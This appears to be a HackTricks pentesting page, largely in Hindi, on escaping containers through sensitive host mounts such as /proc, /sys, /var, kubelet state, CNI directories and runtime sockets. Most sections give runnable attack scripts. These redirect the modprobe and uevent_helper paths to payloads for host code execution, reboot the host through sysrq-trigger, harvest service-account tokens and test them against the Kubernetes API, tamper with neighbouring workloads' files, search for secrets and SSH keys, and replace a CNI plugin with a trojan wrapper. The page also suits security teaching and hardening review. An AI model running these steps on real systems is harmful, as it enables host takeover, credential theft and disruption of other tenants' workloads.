# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts कंटेनर-escape surfaces में सबसे महत्वपूर्ण practical surfaces में से एक हैं, क्योंकि ये अक्सर carefully isolated process view को host resources की direct visibility में बदल देते हैं। खतरनाक cases सिर्फ `/` तक सीमित नहीं हैं। `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, या device-related paths के bind mounts kernel controls, credentials, neighboring container filesystems, और runtime management interfaces expose कर सकते हैं।

यह page अलग से मौजूद है, individual protection pages से, क्योंकि abuse model cross-cutting है। Writable host mount खतरनाक है partly because of mount namespaces, partly because of user namespaces, partly because of AppArmor or SELinux coverage, और partly because exact host path क्या expose हुआ था। इसे अपना अलग topic मानने से attack surface को समझना काफी आसान हो जाता है।

## `/proc` Exposure

procfs में ordinary process information के साथ-साथ high-impact kernel control interfaces भी होते हैं। इसलिए `-v /proc:/host/proc` जैसा bind mount या ऐसा container view जो unexpected writable proc entries expose करता है, information disclosure, denial of service, या direct host code execution तक ले जा सकता है।

High-value procfs paths में शामिल हैं:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

सबसे पहले check करें कि कौन-सी high-value procfs entries visible या writable हैं:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
ये paths अलग-अलग कारणों से interesting हैं। `core_pattern`, `modprobe`, और `binfmt_misc` writable होने पर host code-execution paths बन सकते हैं। `kallsyms`, `kmsg`, `kcore`, और `config.gz` kernel exploitation के लिए powerful reconnaissance sources हैं। `sched_debug` और `mountinfo` process, cgroup, और filesystem context reveal करते हैं, जो container के अंदर से host layout को reconstruct करने में मदद कर सकते हैं।

हर path का practical value अलग होता है, और उन सभी को एक जैसा impact मानना triage को कठिन बनाता है:

- `/proc/sys/kernel/core_pattern`
अगर writable हो, तो यह सबसे high-impact procfs paths में से एक है क्योंकि crash के बाद kernel एक pipe handler execute करेगा। जो container `core_pattern` को अपने overlay या किसी mounted host path में stored payload की ओर point कर सकता है, वह अक्सर host code execution हासिल कर सकता है। एक dedicated example के लिए [read-only-paths.md](protections/read-only-paths.md) भी देखें।
- `/proc/sys/kernel/modprobe`
यह path उस userspace helper को control करता है जिसका उपयोग kernel तब करता है जब उसे module-loading logic invoke करनी होती है। अगर container से writable हो और host context में interpreted हो, तो यह host code-execution primitive बन सकता है। यह खासतौर पर interesting है जब इसे helper path trigger करने के तरीके के साथ combine किया जाए।
- `/proc/sys/vm/panic_on_oom`
यह आमतौर पर clean escape primitive नहीं है, लेकिन OOM conditions को kernel panic behavior में बदलकर memory pressure को host-wide denial of service में बदल सकता है।
- `/proc/sys/fs/binfmt_misc`
अगर registration interface writable हो, तो attacker चुने गए magic value के लिए handler register कर सकता है और matching file execute होने पर host-context execution प्राप्त कर सकता है।
- `/proc/config.gz`
kernel exploit triage के लिए useful। यह host package metadata की जरूरत के बिना यह determine करने में मदद करता है कि कौन-से subsystems, mitigations, और optional kernel features enabled हैं।
- `/proc/sysrq-trigger`
ज्यादातर denial-of-service path, लेकिन बहुत serious। यह तुरंत reboot, panic, या किसी अन्य तरह से host को disrupt कर सकता है।
- `/proc/kmsg`
kernel ring buffer messages reveal करता है। host fingerprinting, crash analysis, और कुछ environments में kernel exploitation के लिए useful information leak करने में मददगार।
- `/proc/kallsyms`
Readable होने पर valuable, क्योंकि यह exported kernel symbol information expose करता है और kernel exploit development के दौरान address randomization assumptions को defeat करने में मदद कर सकता है।
- `/proc/[pid]/mem`
यह direct process-memory interface है। अगर target process आवश्यक ptrace-style conditions के साथ reachable हो, तो यह दूसरे process की memory पढ़ने या modify करने की अनुमति दे सकता है। वास्तविक impact credentials, `hidepid`, Yama, और ptrace restrictions पर बहुत depend करता है, इसलिए यह powerful लेकिन conditional path है।
- `/proc/kcore`
system memory का core-image-style view expose करता है। यह file बहुत बड़ी और उपयोग में awkward है, लेकिन अगर यह meaningfully readable हो, तो यह badly exposed host memory surface को indicate करता है।
- `/proc/kmem` और `/proc/mem`
Historically high-impact raw memory interfaces। कई modern systems पर ये disabled या heavily restricted होते हैं, लेकिन अगर present और usable हों तो इन्हें critical findings मानना चाहिए।
- `/proc/sched_debug`
scheduling और task information leak करता है, जो host process identities expose कर सकती है, भले ही अन्य process views अपेक्षा से अधिक clean दिखें।
- `/proc/[pid]/mountinfo`
यह reconstruct करने के लिए बेहद useful है कि container वास्तव में host पर कहाँ है, कौन-से paths overlay-backed हैं, और क्या कोई writable mount host content से संबंधित है या केवल container layer से।

अगर `/proc/[pid]/mountinfo` या overlay details readable हों, तो उनका उपयोग container filesystem के host path को recover करने के लिए करें:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
ये commands उपयोगी हैं क्योंकि कई host-execution tricks को container के अंदर के path को host के point of view से corresponding path में बदलना पड़ता है।

### Full Example: `modprobe` Helper Path Abuse

अगर `/proc/sys/kernel/modprobe` container से writable है और helper path को host context में interpret किया जाता है, तो इसे attacker-controlled payload की ओर redirect किया जा सकता है:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
सटीक trigger target और kernel behavior पर निर्भर करता है, लेकिन महत्वपूर्ण बात यह है कि एक writable helper path future kernel helper invocation को attacker-controlled host-path content की ओर redirect कर सकता है।

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

यदि goal exploitability assessment है, न कि immediate escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
ये commands यह answer करने में मदद करते हैं कि क्या useful symbol information visible है, क्या recent kernel messages interesting state reveal करते हैं, और कौन-सी kernel features या mitigations compiled in हैं। इसका impact usually direct escape नहीं होता, लेकिन यह kernel-vulnerability triage को काफी short कर सकता है।

### Full Example: SysRq Host Reboot

अगर `/proc/sysrq-trigger` writable है और host view तक पहुंचता है:
```bash
echo b > /proc/sysrq-trigger
```
The effect is immediate host reboot. This is not a subtle example, but it clearly demonstrates that procfs exposure can be far more serious than information disclosure.

## `/sys` Exposure

sysfs kernel और device state की बड़ी मात्रा expose करता है। कुछ sysfs paths मुख्य रूप से fingerprinting के लिए उपयोगी होते हैं, जबकि अन्य helper execution, device behavior, security-module configuration, या firmware state को प्रभावित कर सकते हैं।

High-value sysfs paths में शामिल हैं:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

इन paths का महत्व अलग-अलग कारणों से है। `/sys/class/thermal` thermal-management behavior को प्रभावित कर सकता है और इसलिए badly exposed environments में host stability पर असर डाल सकता है। `/sys/kernel/vmcoreinfo` crash-dump और kernel-layout जानकारी leak कर सकता है, जो low-level host fingerprinting में मदद करती है। `/sys/kernel/security` Linux Security Modules द्वारा उपयोग किया जाने वाला `securityfs` interface है, इसलिए वहां unexpected access MAC-related state को expose या alter कर सकता है। EFI variable paths firmware-backed boot settings को प्रभावित कर सकते हैं, जिससे वे ordinary configuration files की तुलना में कहीं अधिक गंभीर हो जाते हैं। `/sys/kernel/debug` के अंतर्गत `debugfs` विशेष रूप से खतरनाक है क्योंकि यह जानबूझकर developer-oriented interface है, जिसमें hardened production-facing kernel APIs की तुलना में safety expectations बहुत कम होती हैं।

इन paths के लिए उपयोगी review commands हैं:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
उन commands को interesting बनाने वाली बातें:

- `/sys/kernel/security` यह reveal कर सकता है कि AppArmor, SELinux, या कोई और LSM surface इस तरह visible है जो host-only रहना चाहिए था।
- `/sys/kernel/debug` अक्सर इस group में सबसे alarming finding होता है। अगर `debugfs` mounted है और readable या writable है, तो एक wide kernel-facing surface की उम्मीद करें, जिसका exact risk enabled debug nodes पर depend करता है।
- EFI variable exposure कम common है, लेकिन अगर present हो, तो यह high impact है क्योंकि यह ordinary runtime files के बजाय firmware-backed settings को touch करता है।
- `/sys/class/thermal` मुख्य रूप से host stability और hardware interaction के लिए relevant है, न कि neat shell-style escape के लिए।
- `/sys/kernel/vmcoreinfo` मुख्य रूप से host-fingerprinting और crash-analysis source है, जो low-level kernel state को समझने के लिए useful है।

### Full Example: `uevent_helper`

अगर `/sys/kernel/uevent_helper` writable है, तो kernel `uevent` trigger होने पर attacker-controlled helper execute कर सकता है:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
इसका कारण यह है कि helper path को host के दृष्टिकोण से interpret किया जाता है। एक बार trigger होने पर, helper current container के अंदर नहीं बल्कि host context में run होता है।

## `/var` Exposure

Host के `/var` को container में mount करना अक्सर कम आंका जाता है क्योंकि यह `/` को mount करने जितना dramatic नहीं दिखता। व्यवहार में, यह runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, और neighboring application filesystems तक पहुंचने के लिए पर्याप्त हो सकता है। आधुनिक nodes पर, `/var` अक्सर वही स्थान होता है जहां सबसे operationally interesting container state वास्तव में रहता है।

### Kubernetes Example

`hostPath: /var` वाला एक pod अक्सर अन्य pods के projected tokens और overlay snapshot content को read कर सकता है:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
ये commands उपयोगी हैं क्योंकि ये बताते हैं कि mount केवल dull application data expose करता है या high-impact cluster credentials। एक readable service-account token तुरंत local code execution को Kubernetes API access में बदल सकता है।

अगर token present है, तो token discovery पर रुकने के बजाय validate करें कि यह क्या reach कर सकता है:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
यहाँ प्रभाव स्थानीय node access से कहीं बड़ा हो सकता है। एक token with broad RBAC mounted `/var` को cluster-wide compromise में बदल सकता है।

### Docker And containerd Example

Docker hosts पर relevant data अक्सर `/var/lib/docker` के तहत होता है, जबकि containerd-backed Kubernetes nodes पर यह `/var/lib/containerd` या snapshotter-specific paths में हो सकता है:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
यदि mounted `/var` किसी अन्य workload की writable snapshot contents expose करता है, तो attacker current container configuration को touch किए बिना application files बदल सकता है, web content plant कर सकता है, या startup scripts change कर सकता है।

जब writable snapshot content मिल जाए, तो concrete abuse ideas:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
ये commands उपयोगी हैं क्योंकि ये mounted `/var` के तीन मुख्य impact families दिखाती हैं: application tampering, secret recovery, और neighboring workloads में lateral movement।

## Kubelet State, Plugins, And CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin`, या `/etc/cni/net.d` का mount अक्सर privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, और storage helpers के जरिए exposed होता है। इन mounts को आसानी से "node plumbing" समझकर नजरअंदाज किया जा सकता है, लेकिन ये नए pods के लिए execution path में सीधे होते हैं और अक्सर kubelet credentials, projected secrets, registration sockets, और executable host-side plugin binaries रखते हैं।

High-value targets में शामिल हैं:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Why these paths matter:

- `/var/lib/kubelet/pki` kubelet client certificates और अन्य node-local credentials expose कर सकता है, जिन्हें कभी-कभी API server या kubelet-facing TLS endpoints के against reuse किया जा सकता है, cluster design पर निर्भर करते हुए।
- `/var/lib/kubelet/pods` में अक्सर projected service-account tokens और उसी node पर neighboring pods के लिए mounted Secrets होते हैं।
- `/var/lib/kubelet/pod-resources/kubelet.sock` मुख्यतः एक reconnaissance surface है, लेकिन बहुत useful: यह दिखाता है कि कौन से pods और containers के पास अभी GPUs, hugepages, SR-IOV devices, और अन्य scarce node-local resources हैं।
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, और `/var/lib/kubelet/plugins_registry` reveal करते हैं कि कौन से CSI, DRA, और device plugins installed हैं और kubelet किन sockets से बात करने की उम्मीद करता है। अगर ये directories केवल readable नहीं बल्कि writable हों, तो finding कहीं अधिक serious हो जाती है।
- `/opt/cni/bin` और `/etc/cni/net.d` सीधे pod-network setup path पर होते हैं। वहाँ writable access अक्सर सिर्फ configuration exposure नहीं, बल्कि delayed host-execution primitive होता है।

### Full Example: Writable `/opt/cni/bin`

अगर host CNI binary directory read-write mounted है, तो किसी plugin को replace करना उस node पर अगली बार kubelet जब pod sandbox बनाता है, host execution पाने के लिए पर्याप्त हो सकता है:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
यह mounted `docker.sock` जितना immediate नहीं है, लेकिन compromised Kubernetes infrastructure pods में यह अक्सर अधिक realistic होता है। महत्वपूर्ण बात यह है कि modified binary को बाद में host network setup flow द्वारा execute किया जाता है, current container द्वारा नहीं।


## Runtime Sockets

Sensitive host mounts अक्सर full directories के बजाय runtime sockets शामिल करते हैं। ये इतने महत्वपूर्ण हैं कि यहाँ इनका explicit repetition देना चाहिए:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
पूर्ण exploitation flows के लिए [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) देखें, जब इनमें से कोई एक socket mount हो जाए।

एक त्वरित first interaction pattern के रूप में:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
यदि इनमें से कोई एक सफल होता है, तो "mounted socket" से "एक अधिक privileged sibling container शुरू करना" तक का रास्ता आमतौर पर किसी kernel breakout path की तुलना में कहीं छोटा होता है।

## Mount-Related CVEs

Host mounts runtime vulnerabilities के साथ भी intersect करते हैं। महत्वपूर्ण हालिया उदाहरणों में शामिल हैं:

- `CVE-2024-21626` in `runc`, जहाँ एक leaked directory file descriptor working directory को host filesystem पर रख सकता था।
- `CVE-2024-23651`, `CVE-2024-23652`, और `CVE-2024-23653` in BuildKit, जहाँ malicious Dockerfiles, frontends, और `RUN --mount` flows build के दौरान host file access, deletion, या elevated privileges को फिर से introduce कर सकते थे।
- `CVE-2024-1753` in Buildah और Podman build flows, जहाँ build के दौरान crafted bind mounts `/` को read-write expose कर सकते थे।
- `CVE-2025-47290` in `containerd` 2.1.0, जहाँ image unpack के दौरान एक TOCTOU specially crafted image को pull के दौरान host filesystem modify करने दे सकता था।

ये CVEs यहाँ इसलिए महत्वपूर्ण हैं क्योंकि ये दिखाते हैं कि mount handling सिर्फ operator configuration के बारे में नहीं है। runtime itself भी mount-driven escape conditions introduce कर सकता है।

## Checks

इन commands का उपयोग सबसे high-value mount exposures को जल्दी locate करने के लिए करें:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
What is interesting here:

- Host root, `/proc`, `/sys`, `/var`, और runtime sockets सभी high-priority findings हैं।
- Writable proc/sys entries अक्सर इसका मतलब होते हैं कि mount host-global kernel controls expose कर रहा है, न कि safe container view।
- Mounted `/var` paths को credential और neighboring-workload review की जरूरत होती है, सिर्फ filesystem review की नहीं।
- Kubelet state directories और CNI/plugin paths को runtime sockets जितनी ही priority देनी चाहिए, क्योंकि वे अक्सर सीधे node के pod-creation और credential-distribution path पर होते हैं।

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
